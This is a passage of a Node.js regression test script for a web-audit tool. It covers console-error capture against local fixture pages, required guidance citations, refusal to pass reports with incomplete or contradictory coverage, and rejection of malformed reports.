#!/usr/bin/env node
import http from 'node:http';
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readdirSync, readlinkSync, readFileSync, rmSync, statSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join, resolve } from 'node:path';
import { spawn, spawnSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';
import Ajv2020 from 'ajv/dist/2020.js';
import addFormats from 'ajv-formats';
import { assertPageDerivedFetchAllowed, gather, iconSatisfies, isFirstPartyHost, isThirdPartyCookie, redactHeaderList, safeFetch, scanTextForSecrets, waitForInteractEvidence } from '../evidence/cli.mjs';
import { AGENTS } from '../runner/agents.mjs';
import { launchChrome, resolveChromePath } from '../evidence/cdp.mjs';

const repoRoot = resolve(fileURLToPath(new URL('..', import.meta.url)));
const tmp = mkdtempSync(join(tmpdir(), 'web-uplift-regression-'));
const SKIP_DIRS = new Set(['.git', 'node_modules', 'reports', 'scratch']);

try {
  testSyntaxChecks();
  testPackageRootImportIsSideEffectFree();
  testChromeCandidateDiscovery();
  testIconSatisfiesMatrix();
  testFirstPartyHostMatrix();
  await testPageDerivedFetchGuard();
  await testSafeFetchRedirectAndSizeGuard();
  await testLaunchRetryAndDiagnostics();
  testSchemaValidation();
  testAtomicCoverageValidator();
  testGuidanceUsage();
  testGuidanceVersionPinnedInDocs();
  testHeadlessAllowlistIsScoped();
  testRedactHeaderList();
  testInstalledEvidenceCli();
  testUpdateDryRunReadsInstallManifest();
  testCachedUpdateWarning();
  await testPreNavigationEmulation();
  await testAxePrimitiveBypassesStrictCsp();
  await testThrottlingConditions();
  await testLocaleTimezoneConditions();
  await testHarRedirects();
  await testTrackersThirdPartySuffix();
  await testHarWaitsForPendingResponses();
  await testHarRedactsCredentialHeaders();
  await testAxeKeepsPagePolicyAndDisclosesInjectionBypass();
  await testHeadersPrimitiveFindsHeadersRegardlessOfNameCase();
  await testHarReadsRequestContentTypeAndRedirectLocationRegardlessOfCase();
  await testSecretsArtifactDoesNotPersistMatches();
  testSecretsScanDoesNotPersistMatchCharacters();
  await testEvidenceTruncationReporting();
  await testConsoleEvidence();
  await testConsoleInteractDeadlineValidation();
  await testFeaturesPrimitive();
  testBatchDryRunUsesRetainedDirs();
  testBatchFlowDryRun();
  testFixSurvivesUnscoreableReports();
  testFixRefusesPassOnIncompleteCoverage();
  testFixRefusesContradictoryCoverageClaim();
  testFixRejectsMalformedReports();
  await testFixWriteScopeDiffing();
  testFixModeRefusesOutOfScopeWrites();
  testFixModeScopeEdgeCases();
  testFixIsolationAssertion();
  testFixIsolatedRunPublishes();
  testBatchWriteScope();
  await testCompareReportsUnconcludedChecks();
  await testScorecardScoringAndRender();
  await testScorecardArtifactContainment();
  await testCompareArtifactContainment();
  await testDiscoverabilityHelpers();
  await testDiscoverabilityH1InRaw();
  await testTargetsPrimitive();
  await testResiliencePrimitive();
  await testA11yTreePrimitive();
  await testBaselineOracle();
  await testFlowNormalize();
  await testLaunchSessionLoop();
  await testNoOrphanBrowser();
  console.log('tests OK');
} finally {
  rmSync(tmp, { recursive: true, force: true });
}

// Modern Web Guidance is mandatory: a report with issue-findings must record the
// guides it consulted, and every issue-finding must cite a guidanceId drawn from
// that list. This is what stops the "audit judged from memory, never called MWG"
// failure users reported — a report that skipped guidance fails validation here.
function testAtomicCoverageValidator() {
  const validator = join(repoRoot, 'schema', 'validate-report.mjs');
  const catalog = join(repoRoot, 'knowledge', 'principles.json');
  const valid = run(process.execPath, [validator, catalog, join(repoRoot, 'examples', 'playground-report.json')]);
  assert(valid.status === 0, `atomic coverage: valid fixture failed:\n${valid.stderr}\n${valid.stdout}`);

  const incomplete = JSON.parse(readFileSync(join(repoRoot, 'examples', 'playground-report.json'), 'utf8'));
  incomplete.checkOutcomes = incomplete.checkOutcomes.slice(1);
  incomplete.status = 'partial';
  incomplete.coverage = { ...incomplete.coverage, recorded: incomplete.checkOutcomes.length, judged: incomplete.checkOutcomes.length, missing: 1, complete: false };
  delete incomplete.overallScore;
  const incompletePath = join(tmp, 'incomplete-report.json');
  writeFileSync(incompletePath, JSON.stringify(incomplete));
  const rejected = run(process.execPath, [validator, catalog, incompletePath]);
  assert(rejected.status !== 0, `atomic coverage: missing check was not rejected:\n${rejected.stderr}\n${rejected.stdout}`);
}

function testGuidanceUsage() {
  const report = JSON.parse(readFileSync(join(repoRoot, 'examples/playground-report.json'), 'utf8'));
  const findings = report.findings || [];
  assert(findings.length > 0, 'guidance: fixture should have issue-findings to check');
  const consulted = report.guidanceConsulted || [];
  assert(Array.isArray(consulted) && consulted.length > 0,
    'guidance: a report with issue-findings must populate guidanceConsulted (MWG was not called)');
  const consultedSet = new Set(consulted);
  for (const f of findings) {
    assert(typeof f.guidanceId === 'string' && f.guidanceId.length > 0,
      `guidance: finding ${f.id} is missing a guidanceId (its fix is not backed by Modern Web Guidance)`);
    assert(consultedSet.has(f.guidanceId),
      `guidance: finding ${f.id} cites guidanceId "${f.guidanceId}" that is not in guidanceConsulted`);
  }
  // The clean/fixed report may have no findings, but if it lists guidance it must be an array.
  const fixed = JSON.parse(readFileSync(join(repoRoot, 'examples/playground-report-fixed.json'), 'utf8'));
  assert(fixed.guidanceConsulted === undefined || Array.isArray(fixed.guidanceConsulted),
    'guidance: fixed report guidanceConsulted must be an array when present');
}

// follow-best-practices/no-console-errors needs first-party evidence: what the
// page logged DURING load is invisible to a post-load evaluate probe, so the
// console primitive collects Runtime + Log events from before the navigation.
// The counts are split by source so a failed subresource request is not
// confused with a page-authored console error (web-uplift-2dg).
async function testConsoleEvidence() {
  const noisy = [
    '<!doctype html><html><head><title>noisy</title><script>',
    "  console.warn('fixture warning');",
    "  console.error('fixture console error');",
    "  console.error('fixture console error');",
    "  setTimeout(function () { throw new Error('fixture uncaught exception'); }, 0);",
    "  fetch('/missing.json').catch(function () {});",
    '</script></head><body><p>Deterministic console story.</p></body></html>',
  ].join('\n');
  const clean = '<!doctype html><html><head><title>clean</title></head><body><p>Nothing is logged here.</p>' +
    '<button id="boom">boom</button>' +
    "<script>document.querySelector('#boom').addEventListener('click', function () { throw new Error('fixture interact exception'); });</script>" +
    '</body></html>';

  const server = http.createServer((req, res) => {
    const path = (req.url || '').split('?')[0];
    if (path === '/favicon.ico') {
      res.writeHead(204);
      res.end();
      return;
    }
    if (path === '/clean') {
      res.writeHead(200, { 'Content-Type': 'text/html' });
      res.end(clean);
      return;
    }
    if (path === '/noisy') {
      res.writeHead(200, { 'Content-Type': 'text/html' });
      res.end(noisy);
      return;
    }
    res.writeHead(404, { 'Content-Type': 'text/plain' });
    res.end('not found');
  });

  await new Promise((resolveListen) => server.listen(0, '127.0.0.1', resolveListen));
  try {
    const { port } = server.address();
    const base = `http://127.0.0.1:${port}`;

    const result = await gather('console', `${base}/noisy`, { quiet: true, wait: 500 });
    const block = result.console;
    assert(
      block.exceptionCount === 1 && block.entries.some((e) => e.kind === 'exception' && e.text.includes('fixture uncaught exception')),
      `console: the load-time exception was not captured: ${JSON.stringify(block)}`,
    );
    assert(
      block.consoleErrorCount === 1 && block.entries.some((e) => e.text.includes('fixture console error')),
      `console: the load-time console error was not captured: ${JSON.stringify(block)}`,
    );
    assert(
      block.warningCount === 1 && block.entries.some((e) => e.text.includes('fixture warning')),
      `console: the console warning was not captured: ${JSON.stringify(block)}`,
    );
    assert(
      block.networkErrorCount === 1 && block.entries.some((e) => e.source === 'network' && (e.url || '').endsWith('/missing.json')),
      `console: the failed subresource request was not captured separately: ${JSON.stringify(block)}`,
    );
    assert(block.hasErrors === true, `console: a page that threw should report errors: ${JSON.stringify(block)}`);
    const repeated = block.entries.find((e) => e.text.includes('fixture console error'));
    assert(repeated.repeat === 2, `console: identical messages should collapse into a repeat count: ${JSON.stringify(repeated)}`);
    const exception = block.entries.find((e) => e.kind === 'exception');
    assert(Array.isArray(exception.stack) && exception.stack.length > 0, `console: an exception should carry a stack frame: ${JSON.stringify(exception)}`);

    // Every primitive carries the block, and the artifact a primitive writes has
    // to agree with its stdout: that is what emit() is for.
    const out = join(tmp, 'console-dom-artifact.json');
    const cli = await runAsync(process.execPath, [
      'evidence/cli.mjs', 'dom', `${base}/noisy`, '--wait', '300', '--out', out, '--interact-deadline', '2000',
    ]);
    assert(cli.status === 0, `console: dom CLI failed:\n${cli.stderr}`);
    const artifact = JSON.parse(readFileSync(out, 'utf8'));
    const stdout = JSON.parse(cli.stdout);
    assert(
      artifact.console?.exceptionCount === 1 && stdout.console?.exceptionCount === 1,
      `console: the console block should ride along on other primitives, in the artifact and stdout:\n${JSON.stringify({ artifact: artifact.console, stdout: stdout.console })}`,
    );

    // A page that logs nothing reports zeroes: the empty block is the evidence
    // that the check can pass, not the absence of evidence.
    const cleanResult = await gather('console', `${base}/clean`, { quiet: true, wait: 400 });
    assert(
      cleanResult.console.entryCount === 0 && cleanResult.console.hasErrors === false && cleanResult.console.entries.length === 0,
      `console: a page that logs nothing must report zeroes: ${JSON.stringify(cleanResult.console)}`,
    );

    // Interaction errors count too: the same page throws only when its button is
    // clicked, which is exactly the error class a post-load probe cannot see.
    const interactResult = await gather('console', `${base}/clean`, {
      quiet: true,
      wait: 400,
      // An explicit deadline: under load the zero-delay click's exception can
      // cross the old fixed 250ms window, which was the 7kl flake.
      interactDeadlineMs: 2000,
      interact: "setTimeout(() => document.querySelector('#boom').click(), 0)",
    });
    assert(
      interactResult.console.exceptionCount === 1 &&
        interactResult.console.entries.some((e) => e.text.includes('fixture interact exception')),
      `console: an error raised by --interact was not captured: ${JSON.stringify(interactResult.console)}`,
    );
    assert(
      interactResult.interactObserved === true && interactResult.interactEvidencePending === false,
      `console: a captured interact must report observed evidence and no truncation: ${JSON.stringify({ observed: interactResult.interactObserved, pending: interactResult.interactEvidencePending, wait: interactResult.interactWaitMs })}`,
    );

    // AC1: a benign entry at +0ms must not mask a throw at +100ms. A poll that
    // returns on the FIRST new entry misses the exception; the trailing silence
    // window is what catches it.
    const mixedResult = await gather('console', `${base}/clean`, {
      quiet: true,
      wait: 400,
      interactDeadlineMs: 2000,
      interact:
        "setTimeout(() => console.warn('fixture benign entry'), 0);" +
        "setTimeout(() => document.querySelector('#boom').click(), 100)",
    });
    assert(
      mixedResult.console.warningCount === 1 &&
        mixedResult.console.entries.some((e) => e.text.includes('fixture benign entry')),
      `console: the benign interact entry was not captured: ${JSON.stringify(mixedResult.console)}`,
    );
    assert(
      mixedResult.console.exceptionCount === 1 &&
        mixedResult.console.entries.some((e) => e.text.includes('fixture interact exception')),
      `console: a throw after an earlier benign entry was missed (first-entry-only exit): ${JSON.stringify(mixedResult.console)}`,
    );

    // AC2: a quiet interaction costs the default settle, not the hard deadline,
    // and is not reported as a pending failure.
    const quietResult = await gather('console', `${base}/clean`, { quiet: true, wait: 400, interact: 'void 0' });
    assert(
      quietResult.interactObserved === false && quietResult.interactEvidencePending === false,
      `console: a quiet interact must not report observed or pending evidence: ${JSON.stringify({ observed: quietResult.interactObserved, pending: quietResult.interactEvidencePending })}`,
    );
    assert(
      quietResult.interactWaitMs >= 200 && quietResult.interactWaitMs < 1000,
      `console: a quiet interact must return on the default settle, not the hard deadline: ${quietResult.interactWaitMs}ms`,
    );

    // AC3: with an explicit longer deadline, an entry that only arrives at +700ms
    // is still captured, and the reported wait reflects it.
    const delayedResult = await gather('console', `${base}/clean`, {
      quiet: true,
      wait: 400,
      interactDeadlineMs: 2000,
      interact: "setTimeout(() => document.querySelector('#boom').click(), 700)",
    });
    assert(
      delayedResult.console.exceptionCount === 1 &&
        delayedResult.console.entries.some((e) => e.text.includes('fixture interact exception')),
      `console: an interact error raised after the old 250ms window was not captured: ${JSON.stringify(delayedResult.console)}`,
    );
    assert(
      delayedResult.interactEvidencePending === false,
      `console: the poll must report that evidence arrived rather than pending: ${JSON.stringify({ wait: delayedResult.interactWaitMs, pending: delayedResult.interactEvidencePending })}`,
    );
    assert(
      typeof delayedResult.interactWaitMs === 'number' && delayedResult.interactWaitMs >= 650,
      `console: the poll must wait for the delayed entry and report how long it waited: ${delayedResult.interactWaitMs}`,
    );

    // A typo'd --interact-deadline must fail fast at parse time rather than
    // becoming an unbounded wait (NaN / Infinity) or a vacuous one (<= 0). These
    // are parse errors, so no browser is launched (web-uplift-3t2 review).
    for (const bad of ['foo', '0', '-5', 'Infinity', 'NaN', '']) {
      const rejected = await runAsync(process.execPath, [
        'evidence/cli.mjs', 'console', `${base}/clean`, '--interact', 'void 0', '--interact-deadline', bad,
      ]);
      assert(
        rejected.status !== 0 && /--interact-deadline must be a positive number/.test(rejected.stderr),
        `console: --interact-deadline ${bad} must be rejected with a usage error, got status ${rejected.status}: ${rejected.stderr}`,
      );
    }
  } finally {
    await new Promise((resolveClose) => server.close(resolveClose));
  }
}

// A report that cannot be SCORED is still a legitimate INPUT to the hill-climb.
// fix.mjs used to seed its history with an unguarded scoreOf(baseline), so
// scoreReport's (correct) refusal to score incomplete atomic coverage killed the
// whole fix run with an unhandled throw - including on every report written
// before the coverage contract existed, which has no `coverage` field at all.
// Those are exactly the reports most in need of fixing.
function testFixSurvivesUnscoreableReports() {
  const complete = JSON.parse(readFileSync(join(repoRoot, 'examples/playground-report.json'), 'utf8'));

  // Two shapes that scoreReport refuses: a partial run, and a pre-contract run.
  const partial = structuredClone(complete);
  partial.coverage.complete = false;
  partial.status = 'partial';
  const legacy = structuredClone(complete);
  delete legacy.coverage;

  const fixtures = { partial, legacy };
  for (const [name, report] of Object.entries(fixtures)) {
    writeFileSync(join(tmp, `fix-${name}.json`), JSON.stringify(report));
  }

  // --max-iterations 0 drives the whole path (baseline -> snapshot -> compare ->
  // scorecard) without spawning an agent or a browser.
  const runFix = (findings, extra = []) => run(process.execPath, [
    'fixer/fix.mjs',
    '--findings', findings,
    '--target', join(tmp, 'fix-src'),
    '--audit-url', 'http://127.0.0.1:9/',
    '--out', join(tmp, `fix-out-${Math.random().toString(36).slice(2)}`),
    '--reports-root', join(tmp, `fix-reports-${Math.random().toString(36).slice(2)}`),
    '--max-iterations', '0',
    ...extra,
  ]);

  for (const name of Object.keys(fixtures)) {
    const result = runFix(join(tmp, `fix-${name}.json`));
    assert(!/Refusing to score[\s\S]*at scoreReport/.test(result.stderr),
      `fix: ${name} report crashed the hill-climb instead of degrading:\n${result.stderr}`);
    assert(result.stdout.includes('Score unavailable:'),
      `fix: ${name} report did not explain why the score is unavailable:\n${result.stdout}`);
    assert(result.stdout.includes('score N/A'),
      `fix: ${name} report should print score N/A in the climb summary:\n${result.stdout}`);
    assert(result.stdout.includes('outstanding issue-findings to climb down'),
      `fix: ${name} report should still climb on outstanding findings:\n${result.stdout}`);
  }

  // An unscoreable report must never MEET a score goal. evaluateGates treats a
  // null outcome as not-applicable and PASSES it, so an all-null summary from a
  // partial report would otherwise satisfy every --goal-min and stop the climb
  // on a target that was never measured.
  const goalRun = runFix(join(tmp, 'fix-partial.json'), ['--goal-overall', '1', '--goal-min', 'discoverable=1']);
  assert(!goalRun.stdout.includes('PASS: score goal met.'),
    `fix: an unscoreable report falsely met a score goal:\n${goalRun.stdout}`);
  assert(goalRun.stdout.includes('atomic coverage complete'),
    `fix: the goal failure should name incomplete coverage as the reason:\n${goalRun.stdout}`);

  // The guard must not cost a complete report its score.
  const completeRun = runFix(join(repoRoot, 'examples/playground-report.json'), ['--goal-overall', '1']);
  assert(completeRun.status === 0, `fix: a complete report with a met goal should exit 0:\n${completeRun.stdout}${completeRun.stderr}`);
  assert(completeRun.stdout.includes('PASS: score goal met.'),
    `fix: a complete report should still meet a met goal:\n${completeRun.stdout}`);
  assert(!completeRun.stdout.includes('Score unavailable:'),
    `fix: a complete report must still be scoreable:\n${completeRun.stdout}`);
}

// The atomic coverage contract: a run carrying blocked or not-run checks is
// PARTIAL, never completed. fix.mjs used to decide pass/fail from findings
// alone, so a report with zero findings and five checks that never concluded
// printed "PASS: no outstanding issues remain." and exited 0 - the exact
// absence-of-evidence failure the contract exists to prevent, reintroduced
// through the fix path after the scorecard had closed it.
function testFixRefusesPassOnIncompleteCoverage() {
  const clean = JSON.parse(readFileSync(join(repoRoot, 'examples/playground-report-fixed.json'), 'utf8'));
  assert((clean.findings ?? []).length === 0, 'fix coverage: the fixed fixture should have no findings');

  // Zero findings, but five checks never concluded: three blocked, two not-run.
  const partial = structuredClone(clean);
  partial.status = 'partial';
  for (let i = 0; i < 3; i++) {
    partial.checkOutcomes[i].status = 'blocked';
    partial.checkOutcomes[i].reason = 'Auth wall blocked this path';
  }
  for (let i = 3; i < 5; i++) {
    partial.checkOutcomes[i].status = 'not-run';
    partial.checkOutcomes[i].reason = 'Never attempted';
  }
  partial.coverage = { ...partial.coverage, judged: 53, blocked: 3, notRun: 2, complete: false };
  delete partial.overallScore;
  writeFileSync(join(tmp, 'fix-zero-findings-partial.json'), JSON.stringify(partial));

  // The same rows, but the report DECLARES itself complete. The checkOutcomes
  // rows are the authority, not the self-declaration, so this must not pass
  // either. Without that rule a report could buy a pass by lying in one field.
  const lying = structuredClone(partial);
  lying.status = 'completed';
  lying.coverage.complete = true;
  writeFileSync(join(tmp, 'fix-lying-complete.json'), JSON.stringify(lying));

  const runFix = (findings, extra = []) => run(process.execPath, [
    'fixer/fix.mjs',
    '--findings', findings,
    '--target', join(tmp, 'fix-src'),
    '--audit-url', 'http://127.0.0.1:9/',
    '--out', join(tmp, `fixcov-out-${Math.random().toString(36).slice(2)}`),
    '--reports-root', join(tmp, `fixcov-reports-${Math.random().toString(36).slice(2)}`),
    '--max-iterations', '0',
    ...extra,
  ]);

  for (const name of ['fix-zero-findings-partial', 'fix-lying-complete']) {
    const result = runFix(join(tmp, `${name}.json`));
    assert(!/^PASS:/m.test(result.stdout),
      `fix coverage: ${name} claimed a pass with unconcluded checks:\n${result.stdout}`);
    assert(result.status === 1,
      `fix coverage: ${name} should exit non-zero, got ${result.status}:\n${result.stdout}`);
    assert(/INCOMPLETE coverage \(3 blocked, 2 not-run\)/.test(result.stdout),
      `fix coverage: ${name} should name the unconcluded checks:\n${result.stdout}`);
    assert(result.stdout.includes('5 unconcluded check(s)'),
      `fix coverage: ${name} should count unconcluded checks in the summary:\n${result.stdout}`);
  }

  // A partial run must not buy a pass through a score goal either.
  const goalRun = runFix(join(tmp, 'fix-lying-complete.json'), ['--goal-overall', '1']);
  assert(!goalRun.stdout.includes('PASS: score goal met.'),
    `fix coverage: a partial run met a score goal:\n${goalRun.stdout}`);
  assert(goalRun.stdout.includes('atomic coverage complete'),
    `fix coverage: the goal failure should name incomplete coverage:\n${goalRun.stdout}`);

  // A pre-contract report has no coverage accounting at all, so its completeness
  // is unverifiable rather than clean. Zero findings is not enough to pass: the
  // run proceeds (that is the acl fix) but cannot claim a completed audit.
  const legacy = structuredClone(clean);
  delete legacy.coverage;
  delete legacy.overallScore;
  writeFileSync(join(tmp, 'fix-legacy-clean.json'), JSON.stringify(legacy));
  const legacyRun = runFix(join(tmp, 'fix-legacy-clean.json'));
  assert(!/^PASS:/m.test(legacyRun.stdout),
    `fix coverage: a report with no coverage accounting claimed a pass:\n${legacyRun.stdout}`);
  assert(legacyRun.stdout.includes('no coverage accounting in the report'),
    `fix coverage: the legacy report should say its coverage is unverifiable:\n${legacyRun.stdout}`);

  // A genuinely clean run (no findings, every check concluded) still passes.
  const cleanRun = runFix(join(repoRoot, 'examples/playground-report-fixed.json'));
  assert(cleanRun.status === 0,
    `fix coverage: a clean complete report should exit 0:\n${cleanRun.stdout}${cleanRun.stderr}`);
  assert(cleanRun.stdout.includes('PASS: no outstanding issues remain and every check concluded.'),
    `fix coverage: a clean complete report should pass:\n${cleanRun.stdout}`);
  assert(cleanRun.stdout.includes('0 unconcluded check(s)'),
    `fix coverage: a clean report should report zero unconcluded checks:\n${cleanRun.stdout}`);
}

// A structurally malformed report is invalid INPUT, not a crash (web-uplift-rj2).
// countOutstanding runs before the score safety net, so a non-array
// principleOutcomes or findings used to die with "x.filter is not a function" and
// a raw stack, and a non-array checkOutcomes was silently ignored, which let a
// zero-findings report print PASS. The shape is now validated once, at read time,
// and reported by name.
// web-uplift-cpm: a report whose coverage CLAIMS complete while recording no
// checks used to pass fix mode - "every check concluded" with zero checks, the
// absence-of-evidence failure the atomic coverage contract exists to prevent.
// The publication validator refuses such a report; fix mode now refuses it too,
// by naming the contradiction instead of trusting one asserted field.
function testFixRefusesContradictoryCoverageClaim() {
  const clean = JSON.parse(readFileSync(join(repoRoot, 'examples/playground-report-fixed.json'), 'utf8'));
  assert((clean.findings ?? []).length === 0, 'fix cpm: the fixed fixture should have no findings');
  const expected = Number(clean.coverage?.expected ?? 0);
  const rows = (clean.checkOutcomes ?? []).length;
  assert(expected > 0 && rows === expected, `fix cpm: the fixture should account for every check (rows ${rows}, expected ${expected})`);

  const runFix = (findings) => run(process.execPath, [
    'fixer/fix.mjs',
    '--findings', findings,
    '--target', join(tmp, 'fix-src'),
    '--audit-url', 'http://127.0.0.1:9/',
    '--out', join(tmp, `fixcpm-out-${Math.random().toString(36).slice(2)}`),
    '--reports-root', join(tmp, `fixcpm-reports-${Math.random().toString(36).slice(2)}`),
    '--max-iterations', '0',
  ]);

  // The bead's repro: zero rows, empty accounting, complete: true.
  const zeroRows = structuredClone(clean);
  zeroRows.checkOutcomes = [];
  zeroRows.coverage = { recorded: 0, judged: 0, missing: 0, complete: true };
  zeroRows.status = 'completed';
  writeFileSync(join(tmp, 'cpm-zero-rows.json'), JSON.stringify(zeroRows));

  // The subtler shape: rows exist, but the accounting claims complete while
  // recording only a fraction of the checks the report expects.
  const shortAccounting = structuredClone(clean);
  shortAccounting.checkOutcomes = shortAccounting.checkOutcomes.slice(0, 5);
  shortAccounting.coverage = { ...shortAccounting.coverage, recorded: 5, judged: 5, complete: true };
  writeFileSync(join(tmp, 'cpm-short-accounting.json'), JSON.stringify(shortAccounting));

  const zeroRun = runFix(join(tmp, 'cpm-zero-rows.json'));
  assert(!/^PASS:/m.test(zeroRun.stdout), `fix cpm: a report claiming complete coverage with zero checks must not pass:\n${zeroRun.stdout}`);
  assert(zeroRun.status === 1, `fix cpm: the zero-check claim should exit non-zero, got ${zeroRun.status}:\n${zeroRun.stdout}`);
  assert(
    /coverage\.complete is true but the report records no checks/.test(zeroRun.stdout),
    `fix cpm: the refusal should name the contradiction:\n${zeroRun.stdout}`,
  );

  const shortRun = runFix(join(tmp, 'cpm-short-accounting.json'));
  assert(!/^PASS:/m.test(shortRun.stdout), `fix cpm: 5 of ${expected} recorded must not pass:\n${shortRun.stdout}`);
  assert(shortRun.status === 1, `fix cpm: the short accounting should exit non-zero, got ${shortRun.status}:\n${shortRun.stdout}`);
  assert(
    new RegExp(`coverage\\.complete is true but only 5 of ${expected} checks are recorded`).test(shortRun.stdout),
    `fix cpm: the refusal should name the shortfall:\n${shortRun.stdout}`,
  );

  // The control: a genuinely complete, zero-finding report still passes.
  const cleanRun = runFix(join(repoRoot, 'examples/playground-report-fixed.json'));
  assert(
    cleanRun.status === 0 && /PASS: no outstanding issues remain and every check concluded\./.test(cleanRun.stdout),
    `fix cpm: a genuinely complete clean report must still pass:\n${cleanRun.stdout}${cleanRun.stderr}`,
  );
}

function testFixRejectsMalformedReports() {
  const complete = JSON.parse(readFileSync(join(repoRoot, 'examples/playground-report.json'), 'utf8'));

  const runFix = (findings) => run(process.execPath, [
    'fixer/fix.mjs',
    '--findings', findings,
    '--target', join(tmp, 'fix-src'),
    '--audit-url', 'http://127.0.0.1:9/',
    '--out', join(tmp, `fixshape-out-${Math.random().toString(36).slice(2)}`),
    '--reports-root', join(tmp, `fixshape-reports-${Math.random().toString(36).slice(2)}`),
    '--max-iterations', '0',
  ]);

  // Present but not an array: a named error, exit 1, no raw TypeError, no PASS.
  const malformed = {
    'shape-principle-outcomes': { principleOutcomes: {} },
    'shape-findings': { findings: {} },
    'shape-findings-string': { findings: 'not an array' },
    'shape-check-outcomes': { checkOutcomes: {} },
    'shape-artifacts': { artifacts: {} },
  };
  for (const [name, patch] of Object.entries(malformed)) {
    const path = join(tmp, `${name}.json`);
    const field = Object.keys(patch)[0];
    writeFileSync(path, JSON.stringify({ ...complete, ...patch }));
    const result = runFix(path);
    assert(result.status === 1,
      `fix shape: ${name} should exit 1, got ${result.status}:\n${result.stdout}${result.stderr}`);
    assert(
      result.stderr.includes(`Invalid report at ${path}: "${field}" must be an array`),
      `fix shape: ${name} should fail with a named shape error:\n${result.stderr}`,
    );
    assert(!/is not a function|is not iterable|Cannot read propert/.test(result.stderr),
      `fix shape: ${name} leaked a raw TypeError:\n${result.stderr}`);
    assert(!/^PASS:/m.test(result.stdout),
      `fix shape: ${name} must not pass:\n${result.stdout}`);
  }

  // A whole file that is not an object at all is the same class of input error.
  for (const [name, body] of [['shape-root-string', '"just a string"'], ['shape-root-array', '[1,2,3]']]) {
    const path = join(tmp, `${name}.json`);
    writeFileSync(path, body);
    const result = runFix(path);
    assert(
      result.status === 1 && result.stderr.includes(`Invalid report at ${path}: expected a JSON object`),
      `fix shape: ${name} should fail with a named shape error:\n${result.stderr}`,
    );
  }

  // The guard must not reject legal reports: absent and null fields stay legal
  // (pre-contract reports have no coverage or checkOutcomes at all), and a clean
  // report still runs through to its pass.
  const nullish = { ...structuredClone(complete), principleOutcomes: null, findings: [] };
  const nullishPath = join(tmp, 'shape-nullish.json');
  writeFileSync(nullishPath, JSON.stringify(nullish));
  const nullishRun = runFix(nullishPath);
  assert(
    nullishRun.status === 0 && !/Invalid report at/.test(nullishRun.stderr),
    `fix shape: null/empty fields must stay legal:\n${nullishRun.stdout}${nullishRun.stderr}`,
  );

  const legacy = structuredClone(complete);
  delete legacy.coverage;
  delete legacy.checkOutcomes;
  const legacyPath = join(tmp, 'shape-legacy.json');
  writeFileSync(legacyPath, JSON.stringify(legacy));
  const legacyRun = runFix(legacyPath);
  assert(
    !/Invalid report at/.test(legacyRun.stderr) && legacyRun.stdout.includes('Baseline:'),
    `fix shape: a pre-contract report must stay legal input:\n${legacyRun.stdout}${legacyRun.stderr}`,
  );
}

// A compare between two PARTIAL runs used to print "Outstanding
// issue-findings: 0 -> 0" while checks never concluded in either run, which
// reads as "nothing left to do". compare.mjs had its own findings-only copy of
// countOutstanding (fix.mjs had already grown completionState); the shared
// runner/remaining-work.mjs module is now the single definition both callers
// use, and compare reports the unconcluded checks for BOTH sides with a delta.
async function testCompareReportsUnconcludedChecks() {
  const { compareReports, renderCompareMd } = await import('../aggregate/compare.mjs');
  const clean = JSON.parse(readFileSync(join(repoRoot, 'examples/playground-report-fixed.json'), 'utf8'));
  assert((clean.findings ?? []).length === 0, 'compare: the fixed fixture should have no findings');

  const makePartial = (blocked, notRun) => {
    const r = structuredClone(clean);
    r.status = 'partial';
    const rows = r.checkOutcomes;
    for (let i = 0; i < blocked; i++) { rows[i].status = 'blocked'; rows[i].reason = 'Auth wall blocked this path'; }
    for (let i = blocked; i < blocked + notRun; i++) { rows[i].status = 'not-run'; rows[i].reason = 'Never attempted'; }
    r.coverage = { ...r.coverage, judged: rows.length - blocked - notRun, blocked, notRun, complete: false };
    delete r.overallScore;
    return r;
  };

  const before = makePartial(3, 2); // 5 unconcluded
  const after = makePartial(1, 0);  // 1 unconcluded: four concluded, no finding resolved
  const cmp = compareReports(before, after);
  assert(cmp.summary.unconcludedBefore === 5,
    `compare: unconcludedBefore should be 5, got ${cmp.summary.unconcludedBefore}`);
  assert(cmp.summary.unconcludedAfter === 1,
    `compare: unconcludedAfter should be 1, got ${cmp.summary.unconcludedAfter}`);
  assert(cmp.before.unconcluded === 5 && cmp.after.unconcluded === 1,
    'compare: before/after blocks should carry the unconcluded counts');

  const md = renderCompareMd(cmp, { hostName: 'example.test' });
  assert(md.includes('Outstanding issue-findings:** 0 -> 0'),
    `compare: findings line should still render:\n${md}`);
  assert(md.includes('Unconcluded checks (blocked/not-run):** 5 -> 1 (-4)'),
    `compare: the unconcluded line must state BOTH sides and the delta:\n${md}`);

  // Same module, same counts as the hill-climb gate: fix.mjs and compare.mjs
  // must never disagree about what remains.
  const { countOutstanding, completionState, remaining } = await import('../runner/remaining-work.mjs');
  assert(countOutstanding(before) === 0 && completionState(before).blocked === 3 && completionState(before).notRun === 2,
    'remaining-work: shared module should see the partial before-run');
  assert(remaining(before).total === 5 && remaining(after).total === 1,
    'remaining-work: total should be findings + blocked + not-run');

  // web-uplift-1as: a report that claims complete coverage while recording no
  // checks has zero blocked/not-run rows, so the unconcluded line reads "0 -> 0"
  // and the comparison looks clean. Say the coverage is unaccounted instead of
  // counting nothing.
  const unaccounted = structuredClone(clean);
  unaccounted.checkOutcomes = [];
  unaccounted.coverage = { recorded: 0, judged: 0, missing: 0, complete: true };
  unaccounted.status = 'completed';
  const unaccountedMd = renderCompareMd(compareReports(unaccounted, unaccounted), { hostName: 'example.test' });
  assert(
    unaccountedMd.includes('**Coverage:**') && unaccountedMd.includes('records no checks'),
    `compare: an unaccounted report must be called out, not counted as clean:\n${unaccountedMd}`,
  );
  const completeMd = renderCompareMd(compareReports(clean, clean), { hostName: 'example.test' });
  assert(
    !completeMd.includes('**Coverage:**'),
    `compare: a complete pair must not grow a coverage caveat:\n${completeMd}`,
  );
}

async function testScorecardScoringAndRender() {
  const { scoreReport, renderScorecard, renderTextScorecard, scorecardSummary, evaluateGates, OUTCOMES } = await import('../aggregate/scorecard.mjs');
  const report = JSON.parse(readFileSync(join(repoRoot, 'examples/playground-report.json'), 'utf8'));

  const scored = scoreReport(report);
  const incomplete = structuredClone(report);
  incomplete.coverage.complete = false;
  let refusedIncomplete = false;
  try { scoreReport(incomplete); } catch (error) { refusedIncomplete = /Refusing to score/.test(error.message); }
  assert(refusedIncomplete, 'scorecard: incomplete atomic coverage must be refused');
  // The 9-finding playground should not be perfect, and must not exceed 100.
